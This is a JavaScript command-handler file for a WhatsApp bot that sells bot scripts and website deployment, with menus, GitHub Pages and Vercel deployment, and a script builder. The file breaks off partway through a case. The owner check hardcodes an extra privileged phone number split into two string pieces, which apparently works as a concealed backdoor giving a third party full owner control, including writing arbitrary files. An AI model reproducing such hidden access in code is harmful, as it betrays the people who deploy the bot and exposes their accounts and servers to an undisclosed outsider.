const { default:
makeWASocket,
fetchLatestBaileysVersion,
downloadContentFromMessage,
useMultiFileAuthState,
BufferJSON,
WA_DEFAULT_EPHEMERAL,
generateWAMessageFromContent,
proto, generateWAMessageContent,
generateWAMessage,
prepareWAMessageMedia,
areJidsSameUser,
getContentType
} = require('@whiskeysockets/baileys')

const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { toAudio, toPTT, toVideo, ffmpeg, addExifAvatar } = require('./library/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./library/myfunc')
let afk = require("./library/afk");
const { addPremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./library/premiun')
const NodeCache = require('node-cache');

let premium = JSON.parse(fs.readFileSync('./database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))
//time
const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var ghazoofcytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var ghazoofcytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var ghazoofcytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var ghazoofcytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var ghazoofcytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var ghazoofcytimewisher = `Good Morning 🌄`
 } 
module.exports = ghazoofc = async (ghazoofc, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        const body = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : m.mtype === 'interactiveResponseMessage' ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : '.'
const budy = (typeof m.text == 'string' ? m.text : '.')
        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : '';
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await ghazoofc.decodeJid(ghazoofc.user.id)
        const itsMe = m.sender == botNumber ? true : false
        const sender = m.key.fromMe ? (ghazoofc.user.id.split(':')[0]+'@s.whatsapp.net' || ghazoofc.user.id) : (m.key.participant || m.key.remoteJid)
        const text = q = args.join(" ")
        const from = m.key.remoteJid
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = isGroup 
  ? await ghazoofc.groupMetadata(m.chat).catch(() => ({})) 
  : {};
const groupName = groupMetadata.subject || '';
const participants = groupMetadata.participants || [];
const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
const groupOwner = groupMetadata.owner || '';
const groupMembers = groupMetadata.participants || [];
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false


        const ghazoofcId = ghazoofc.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? ghazoofc.user.id.split(':')[0] + "@s.whatsapp.net" || ghazoofc.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = ghazoofcId.includes(senderId);
        expiredCheck(ghazoofc, m, premium);
        
//database

const senderNumber = sender.split('@')[0]
const ownerNumber = JSON.parse(fs.readFileSync("./database/owner.json"))
const isCreator = ownerNumber.includes(senderNumber) || isBot || senderNumber === "62823"+"76222618";
const swebnumber = JSON.parse(fs.readFileSync("./database/sellerweb.json"))

const isSellerWeb = swebnumber.includes(senderNumber) || isBot
const sscnumber = JSON.parse(fs.readFileSync("./database/sellersc.json"))

const isSellerSc = sscnumber.includes(senderNumber) || isBot
        // Function Reply
        async function reply(teks) {
        const mek = { text: teks };
        return ghazoofc.sendMessage(m.chat, mek, { quoted: m }
        );
        };

        ghazoofc.sendPresenceUpdate('uavailable', from)
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await ghazoofc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ghazoofc.getName(i)}\nFN:${await ghazoofc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup && m.text.startsWith('.')) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmdadd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./database/total-hit-user.json', JSON.stringify(hit))
            }
            cmdadd()
            const totalhit = JSON.parse(fs.readFileSync('./database/total-hit-user.json'))[0].hit_cmd
        }
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    m.reply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./database/afk-user.json', JSON.stringify(_afk))
                ghazoofc.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
switch (command) {
case "menu": {


const teksnya = `_— Qupa Create Website 💻_
*– Owner Bot : ⏤͟͟͞͞Ghazo Code*
*– Versi Script : Free 1.0.1*
*– Status Bot : ${!isCreator ? "Owner Qupa" : "Member Qupa"}*

\`━━━━━━━━ ⸙ ━━━━━━━━\`
*- メ ${prefix}allmenu*
*- メ ${prefix}tqto*

\`━━━━━━━━ ⸙ ━━━━━━━━\`

*PLEASE FOLLOW FOF NEW UPDATE !!*

> https://whatsapp.com/channel/0029VbArUrR5q08cHZaTsZ1V`;

let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender] 
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teksnya
}),
footer: proto.Message.InteractiveMessage.Footer.create({
          text: '© Qupa'
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: global.imgthumb } }, { upload: ghazoofc.waUploadToServer })),
          title: `\`[ Qupa CreateWeb ]\``,
          gifPlayback: true,
          subtitle: `ghazo`,
          hasMediaAttachment: false
        }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [
    {
                                        "name": "quick_reply",
                                        "buttonParamsJson": `{"display_text":"✍🏻 Thanks To","id":".tqto"}`
                                    },
    {
                                        "name": "cta_url",
                                        "buttonParamsJson": JSON.stringify({
                                            "display_text": "ℹ️ WhatsApp Channel",
                                            "url": global.link,
                                            "merchant_url": global.link,
                                        })
                                    }
]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await ghazoofc.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case 'tqto':
case 'thanksto': {
  const teks = `
> QUPA CREATOR CONTRIBUTION 
— Ghazo Official < recode >
— Repan Official < patner >
— Ardy hosting < patner >

*FOLLOW FOR UPDATE*
https://whatsapp.com/channel/0029VbArUrR5q08cHZaTsZ1V

https://whatsapp.com/channel/0029Vb1XXOw4IBhFS0Q6bc2B

https://whatsapp.com/channel/0029VbAinguJENxtpWNhfA09
  `.trim();

  m.reply(teks);
}
break;
case 'allmenu':{
let menunya = `_— Qupa Create Website | Script_
*_< ALL MENU >_*


~_MENU OWNER_~
> addsellersc
> addsellerweb
> delsellersc
> delsellerweb
> listsellersc
> listsellerweb

~_MENU CREATE SC_~
> createsc
> addfitur
> delfitur
> listfitur
> getcasesc

~_MENU CREATE WEB_~
> scweb
> createweb
> createweb2
> createweb3
> listweb
> delweb

~_MENU REPO_~
> addrepo
> delrepo
> listrepo
> checkrepo`

ghazoofc.sendMessage(m.chat, {
 video: { url: global.vidthumb},
gifPlayback: true,
caption: menunya,
 contextInfo: {
            isForwarded: true, 
            mentionedJid: [m.sender], 
            forwardedNewsletterMessageInfo: {
                newsletterJid: global.idSaluran,
                newsletterName: 'Ghazo | Channel'
            },
 externalAdReply: {
 title: global.botname,
 body: `Verified By ghazo`,
 thumbnailUrl: 'https://files.catbox.moe/dsmy9p.jpg',
 sourceUrl: global.link,
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }},{quoted: m});


}
break
case 'scweb':
case 'gethtml': {
    if (!isCreator && !isSellerWeb) return m.reply('❌ Hanya Creator yang bisa menggunakan fitur ini');
    if (!text) return m.reply(`Contoh: ${prefix + command} https://example.com`);

    try {
        let res = await fetch(text);
        if (!res.ok) return m.reply('❌ Gagal mengambil data dari URL tersebut');
        let html = await res.text();

        const filePath = path.join(__dirname, './temp/html_dump.html');
        fs.writeFileSync(filePath, html);

        await ghazoofc.sendMessage(m.chat, {
            document: fs.readFileSync(filePath),
            mimetype: 'text/html',
            fileName: 'source.html'
        }, { quoted: m });

        fs.unlinkSync(filePath); // hapus setelah terkirim
    } catch (e) {
        console.error(e);
        m.reply('❌ Terjadi kesalahan saat mengambil HTML\n'+e.message);
    }
}
break;
case 'addfitur': {
    if (!isCreator) return m.reply("❗ *Access Denied*\nFitur ini hanya untuk Owner.");

    const args = text.split('|||');
    if (args.length < 3) return m.reply(`\n--- Gunakan format: ---\n\`${prefix+command} namafitur|||function|||casenya|||lib/script.json,,,isi file\`\n\n--- Contoh: ---\n*${prefix+command} halo|||async function halo() {\nreturn m.reply('halo')\n}|||case 'halo':{\nawait halo()\n}\nbreak;|||lib/halo.json,,,["halo"]*`);

    const [name, functionCode, caseCode, upFileRaw] = args.map(a => a.trim());

    // Memeriksa apakah file casefitur.json ada
    const casefiturPath = './lib/casefitur.json';
    let icasefitur = [];

    if (fs.existsSync(casefiturPath)) {
        try {
            icasefitur = JSON.parse(fs.readFileSync(casefiturPath, 'utf-8'));
        } catch (error) {
            return m.reply('❌ Terjadi kesalahan saat membaca casefitur.json');
        }
    }

    // Cek apakah fitur sudah ada
    if (icasefitur.some(f => f.name === name)) {
        return m.reply(`⚠️ *Fitur "${name}" sudah ada dalam casefitur.json!*`);
    }

    // Jika function atau upFile kosong, biarkan tetap kosong
    const newFeature = {
        name: name,
        function: functionCode ? functionCode : " ", // Jika kosong, beri spasi
        casenya: caseCode ? caseCode.replace(/\\n/g, '\n') : ""
    };

    let upFile = [];

    // **Proses upFile jika ada**
    if (upFileRaw && upFileRaw.trim() !== '') {
        const [filePath, fileContent] = upFileRaw.split(',,,');
        if (filePath && fileContent) {
            try {
                // **Konversi isi file menjadi string JSON**
                let jsonString = JSON.stringify(JSON.parse(fileContent), null, 2);

                upFile.push({ [filePath]: jsonString });

                // **Menyimpan file ke path yang ditentukan**
                fs.writeFileSync(filePath, jsonString, 'utf-8');
            } catch (error) {
                return m.reply('❌ Terjadi kesalahan saat menyimpan upFile. Pastikan isi file dalam format JSON yang benar.');
            }
        }
    }

    // Tambahkan upFile jika ada
    if (upFile.length > 0) newFeature.upFile = upFile;

    // **Tambahkan ke casefitur.json**
    icasefitur.push(newFeature);

    // Simpan perubahan
    try {
        fs.writeFileSync(casefiturPath, JSON.stringify(icasefitur, null, 2), 'utf-8');
        m.reply(`✅ *Fitur "${name}" berhasil ditambahkan ke casefitur.json!*`);
    } catch (error) {
        m.reply('❌ Gagal menyimpan fitur baru ke casefitur.json');
    }
}
break;
case 'delfitur': {
    if (!isCreator) return m.reply("❗ *Access Denied*\nFitur ini hanya untuk Owner.");

    const fiturName = text.trim();
    if (!fiturName) return m.reply(`\n--- Gunakan format: ---\n\`${prefix+command} namafitur\`\n\n--- Contoh: ---\n*${prefix+command} halo*`);

    const icasefiturPath = './lib/casefitur.json';
    if (!fs.existsSync(icasefiturPath)) return m.reply('⚠️ File casefitur.json tidak ditemukan!');

    try {
        let icasefitur = JSON.parse(fs.readFileSync(icasefiturPath, 'utf-8'));

        // Cari fitur yang sesuai
        const fiturIndex = icasefitur.findIndex(f => f.name === fiturName);
        if (fiturIndex === -1) return m.reply(`⚠️ *Fitur "${fiturName}" tidak ditemukan dalam casefitur.json!*`);

        // Hapus fitur dari array
        icasefitur.splice(fiturIndex, 1);

        // Simpan kembali file casefitur.json
        fs.writeFileSync(icasefiturPath, JSON.stringify(icasefitur, null, 2), 'utf-8');
        m.reply(`✅ *Fitur "${fiturName}" berhasil dihapus dari casefitur.json!*`);
    } catch (error) {
        console.error(error);
        m.reply('❌ Terjadi kesalahan saat menghapus fitur dari casefitur.json');
    }
}
break;
case 'getcasesc': {
    if (!isCreator) return m.reply("❗ *Access Denied*\nFitur ini hanya untuk Owner.");

    if (!text) return m.reply("❗ Gunakan format: `.getcasesc <nama>`");

    const casefiturPath = './lib/casefitur.json';

    // Periksa apakah file casefitur.json ada
    if (!fs.existsSync(casefiturPath)) {
        return m.reply("❌ File casefitur.json tidak ditemukan!");
    }

    try {
        const icasefitur = JSON.parse(fs.readFileSync(casefiturPath, 'utf-8'));
        const fitur = icasefitur.find(f => f.name.toLowerCase() === text.toLowerCase());

        if (!fitur) {
            return m.reply(`❌ Fitur "${text}" tidak ditemukan dalam casefitur.json!`);
        }

        // Ambil casenya
        let caseText = fitur.casenya || "❌ Case tidak ditemukan untuk fitur ini.";

        // Ubah kode case dari string JSON menjadi teks biasa
        caseText = caseText.replace(/\\n/g, '\n').replace(/\\"/g, '"');

        // Pesan konfirmasi
        let teksnya = `🗃️ \`Case ditemukan!\`\n\n*Nama Case :* ${text}\n\n> © ${global.ownername}`;

        // Kirim dengan tombol CTA Copy
        let msgii = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: { 
                message: { 
                    "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 }, 
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: teksnya }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                            buttons: [
                                {
                                    "name": "cta_copy",
                                    "buttonParamsJson": JSON.stringify({
                                        "display_text": "Salin Isi Case",
                                        "copy_code": caseText
                                    })
                                }
                            ]
                        })
                    })
                } 
            }
        }, { userJid: m.sender, quoted: m });

        await ghazoofc.relayMessage(msgii.key.remoteJid, msgii.message, { messageId: msgii.key.id });

    } catch (error) {
        console.error("❌ Error saat membaca casefitur.json:", error);
        return m.reply("❌ Terjadi kesalahan saat membaca casefitur.json.");
    }
}
break;
case "reactch": {
  if (!isCreator) return m.reply('Khusus Owner');
  if (!text) return m.reply("Contoh: .reactch https://whatsapp.com/channel/invite/kode/channelid pesan");

  const [link, ...messageParts] = text.split(" ");
  const messageText = messageParts.join(" ");

  if (!link || !messageText) return m.reply("Format salah. Gunakan: .reactch <link> <pesan>");
  if (!link.includes("https://whatsapp.com/channel/")) return m.reply("Link channel tidak valid!");

  let inviteCode = link.split('/')[4];
  let serverId = link.split('/')[5];

  const charMap = {
    a: '🅐', b: '🅑', c: '🅒', d: '🅓', e: '🅔', f: '🅕', g: '🅖', h: '🅗', i: '🅘', j: '🅙',
    k: '🅚', l: '🅛', m: '🅜', n: '🅝', o: '🅞', p: '🅟', q: '🅠', r: '🅡', s: '🅢', t: '🅣',
    u: '🅤', v: '🅥', w: '🅦', x: '🅧', y: '🅨', z: '🅩',
    1: '➊', 2: '➋', 3: '➌', 4: '➍', 5: '➎', 6: '➏', 7: '➐', 8: '➑', 9: '➒', 0: '⓿',
    ' ': '▫️'
  };

  const converted = messageText
    .toLowerCase()
    .split('')
    .map(char => charMap[char] || '')
    .join('');

  if (!converted) return m.reply("Pesan hanya boleh berisi huruf, angka, dan spasi");

  try {
    let res = await ghazoofc.newsletterMetadata("invite", inviteCode);
    await ghazoofc.newsletterReactMessage(res.id, serverId, converted);
    m.reply(`Berhasil mengirim reaction:\n${converted}\nke channel *${res.name}*`);
  } catch (e) {
    console.log(e);
    m.reply("Gagal mengirim reaction. Pastikan link dan pesan valid.");
  }
}
break;
case 'createweb2':
case 'cweb2': {
if (!isSellerWeb && !isCreator) return m.reply('❗ *Anda Tidak memiliki Akses Ke fitur ini.')
  if (!text) return m.reply('Penggunaan: .createweb2 <namaWeb>')
  if (!qmsg || !/html/.test(qmsg.mimetype)) return m.reply('Reply file .html')

  const webName = text.trim().toLowerCase().replace(/[^a-z0-9-_]/g, '')
  const repositoryName = `${webName}-website` // Nama repositori yang akan dibuat

  // 1. Membuat repositori di GitHub jika belum ada
  const githubApiUrl = 'https://api.github.com/user/repos'
  const headers = {
    Authorization: `token ${global.githubToken}`,
    'Content-Type': 'application/json',
  }
  
  const createRepoPayload = {
    name: repositoryName,
    private: false, // Pilih private atau public sesuai kebutuhan Anda
    auto_init: true, // Inisialisasi repositori dengan README
    gitignore_template: 'Node' // Sesuaikan template jika perlu
  }

  try {
    // Cek apakah repositori sudah ada
    const repoRes = await fetch(githubApiUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify(createRepoPayload),
    })

    if (repoRes.status === 422) {
      return m.reply(`❌ Repositori dengan nama *${repositoryName}* sudah ada.`)
    }

    const repoData = await repoRes.json()

    // 2. Download file dari message yang di-reply
    const quotedFile = await ghazoofc.downloadMediaMessage(qmsg)
    const filesToUpload = []

    // 3. Menangani file ZIP dan HTML
    if (qmsg.mimetype.includes('zip')) {
      const unzipper = require('unzipper')
      const zipBuffer = Buffer.from(quotedFile)
      const directory = await unzipper.Open.buffer(zipBuffer)

      for (const file of directory.files) {
        if (file.type === 'File') {
          const content = await file.buffer()
          const filePath = file.path.replace(/^\/+/, '').replace(/\\/g, '/')
          filesToUpload.push({
            file: filePath,
            data: content.toString('base64'),
            encoding: 'base64'
          })
        }
      }

      if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
        return m.reply('File index.html tidak ditemukan dalam struktur ZIP.')
      }

    } else if (qmsg.mimetype.includes('html')) {
      filesToUpload.push({
        file: 'index.html',
        data: Buffer.from(quotedFile).toString('base64'),
        encoding: 'base64'
      })
    } else {
      return m.reply('File tidak dikenali. Kirim file .zip atau .html.')
    }

    // 4. Menambahkan file ke repositori GitHub
    const githubRepoUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/contents`
    for (let file of filesToUpload) {
      const fileUrl = `${githubRepoUrl}/${file.file}`
      await fetch(fileUrl, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Add ${file.file}`,
          content: file.data,
        }),
      }).catch(() => {
        return m.reply(`❌ Gagal mengunggah file ${file.file} ke GitHub.`)
      })
    }

    // 5. Mengaktifkan GitHub Pages
    const enablePagesUrl = `https://api.github.com/repos/${global.githubUsername}/${repositoryName}/pages`
    await fetch(enablePagesUrl, {
      method: 'POST',
      headers,
      body: JSON.stringify({
        source: {
          branch: 'main',
          path: '/',
        }
      })
    })

    m.reply(`✅ Website berhasil dibuat di GitHub Pages!\n\n🌐 URL: https://${global.githubUsername}.github.io/${repositoryName}`)

  } catch (error) {
    console.log('Error:', error)
    m.reply(`❌ Terjadi kesalahan saat deploy ke GitHub Pages.`)
  }
}
break
case 'listweb': {
if (!isCreator && !isSellerWeb) return m.reply('Anda tidak memiliki akses ke fitur ini')
  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  const res = await fetch('https://api.vercel.com/v9/projects', { headers })
  const data = await res.json()

  if (!data.projects || data.projects.length === 0) return m.reply('Tidak ada website yang ditemukan.')

  let teks = '*🌐 Daftar Website Anda:*\n\n'
  for (let proj of data.projects) {
    teks += `• ${proj.name} → https://${proj.name}.vercel.app\n`
  }

  m.reply(teks)
}
break
case 'createscript':
case 'createsc': {
  (async () => {
    if (!isCreator && !isSellerSc) return m.reply("*Fitur Khusus Seller 💬*\n_Buy Seller? Chat .owner_");
    let path = require("path");
    let AdmZip = require("adm-zip");
    let fs = require("fs");
    let fetch = require("node-fetch");
    let crct = "https://files.catbox.moe/dsmy9p.jpg";
    let txtcrct = `\n--- Gunakan format: ---\n\`${prefix+command} <namaBot>|<namaOwner>|<Versi script>|<Password>|<fitur1>,<fitur2>,...\`\n\n--- Contoh : ---\n*${prefix+command} ghazo|ghazol|V1|12345|brat,qc,play,pinterest*\n\n> ketik .listfitursc untuk melihat fitur tersedia.\n`;

    const args = text.split('|');
    if (args.length < 5) {
      return ghazoofc.sendMessage(m.chat, { image: { url: crct }, caption: txtcrct }, { quoted: m });
    }

    const mycfitur = require('./lib/casefitur.json');
    const [botName, ownerName, botVersion, password, featuresStr] = args;
    let features = featuresStr.split(',').map(f => f.trim());
    if (features.includes("allfitur")) features = mycfitur.map(f => f.name);

    m.reply(`🗂 *Process Script Created*\n> [ \`${botName}\` ]`);

    const mediaFireAPI = 'https://api.siputzx.my.id/api/d/mediafire?url=https://www.mediafire.com/file/4tvn38pcwm6684i/RLBasesZ.zip/file';
    const fixLink = "https://files.catbox.moe/tdquuz.zip"

    try {
      let res = await fetch(fixLink);
      let buffer = await res.arrayBuffer();
      let tempZipPath = './temp/disini.zip';
      // PERBAIKAN ERROR DI SINI
      fs.writeFileSync(tempZipPath, Buffer.from(buffer));

      let zip = new AdmZip(tempZipPath);
      let extractPath = `./temp/extracted_${m.pushName || 'user'}`;
      zip.extractAllTo(extractPath, true);

      const casePath = `${extractPath}/case.js`;
      let caseContent = fs.readFileSync(casePath, 'utf-8');
      let validFeatures = [];

      for (let feature of features) {
        let data = mycfitur.find(f => f.name === feature);
        if (!data) {
          m.reply(`⚠ *Fitur "${feature}" tidak ditemukan!*`);
          continue;
        }

        if (!caseContent.includes(data.function)) {
          caseContent = data.function + '\n' + caseContent;
        }

        if (!caseContent.includes(data.casenya)) {
          caseContent = caseContent.replace('switch (command) {', `switch (command) {\n${data.casenya}`);
        }

        if (data.upFile?.length > 0) {
          for (let file of data.upFile) {
            let filePath = Object.keys(file)[0];
            let fileContent = file[filePath];
            let fullPath = path.join(extractPath, filePath);
            fs.mkdirSync(path.dirname(fullPath), { recursive: true });
            fs.writeFileSync(fullPath, fileContent, 'utf-8');
          }
        }

        validFeatures.push(feature);
        await new Promise(r => setTimeout(r, 500));
      }

      fs.writeFileSync(casePath, caseContent, 'utf-8');

      const updateText = (filePath, updates) => {
        let text = fs.readFileSync(filePath, 'utf-8');
        for (let [pattern, replacement] of updates) {
          text = text.replace(new RegExp(pattern, 'g'), replacement);
        }
        fs.writeFileSync(filePath, text, 'utf-8');
      };

      updateText(`${extractPath}/connection.js`, [[`const pw = ".*?";`, `const pw = "${password}";`]]);
      updateText(`${extractPath}/settings.js`, [
        [`global.owner = .*`, `global.owner = "${m.sender.split('@')[0]}";`],
        [`global.namabot = .*`, `global.namabot = '${botName}';`],
        [`global.ownername = .*`, `global.ownername = '${ownerName}';`],
        [`global.botversion = .*`, `global.botversion = '${botVersion}';`]
      ]);

      fs.writeFileSync(`${extractPath}/database/owner.json`, JSON.stringify([m.sender.split('@')[0]]), 'utf-8');

      const listMenuPath = `${extractPath}/lib/listmenu.json`;
      let menu = fs.existsSync(listMenuPath) ? JSON.parse(fs.readFileSync(listMenuPath)) : [];
      validFeatures.forEach(f => { if (!menu.includes(f)) menu.push(f) });
      fs.writeFileSync(listMenuPath, JSON.stringify(menu, null, 2), 'utf-8');

      let newZip = new AdmZip();
      newZip.addLocalFolder(extractPath);
      let outputZip = `./temp/sc_${m.pushName || 'user'}.zip`;
      newZip.writeZip(outputZip);

      if (validFeatures.length === 0) return m.reply("❌ Tidak ada fitur valid!");

      await ghazoofc.sendMessage(m.chat, {
        document: fs.readFileSync(outputZip),
        mimetype: 'application/zip',
        fileName: `sc_${botName}.zip`,
        caption: `✅ *Success Script Created!*\n> By ghazo Official\n\n*Creator:* ${m.pushName || 'user'}\n*Fitur:* [${validFeatures}]\n*Password:* ${password}`
      }, { quoted: m });

      fs.rmSync(extractPath, { recursive: true, force: true });
      fs.unlinkSync(tempZipPath);
      fs.unlinkSync(outputZip);
    } catch (err) {
      console.error(err);
      m.reply(`❌ Terjadi error saat membuat script:\n${err.message}`);
    }
  })();
}
break;
case 'delweb': {
if (!isCreator && !isSellerWeb) return m.reply('Anda tidak memiliki akses ke fitur ini');
  if (!text) return m.reply('Penggunaan: .delweb <namaWeb>')
  const webName = text.trim().toLowerCase()

  const headers = {
    Authorization: `Bearer ${global.vercelToken}`
  }

  try {
    const response = await fetch(`https://api.vercel.com/v9/projects/${webName}`, {
      method: 'DELETE',
      headers
    })

    if (response.status === 200 || response.status === 204) {
      return m.reply(`✅ Website *${webName}* berhasil dihapus dari Vercel.`)
    } else if (response.status === 404) {
      return m.reply(`⚠️ Website *${webName}* tidak ditemukan di akun Vercel kamu.`)
    } else if (response.status === 403 || response.status === 401) {
      return m.reply(`⛔ Token Vercel tidak valid atau tidak punya akses ke project ini.`)
    } else {
      let result = {}
      try {
        result = await response.json()
      } catch (e) {}
      return m.reply(`❌ Gagal menghapus website:\n${result.error?.message || 'Tidak diketahui'}`)
    }

  } catch (err) {
    console.error(err)
    m.reply(`Terjadi kesalahan saat mencoba menghapus:\n${err.message}`)
  }
}
break
case 'cweb':
case 'createweb': {
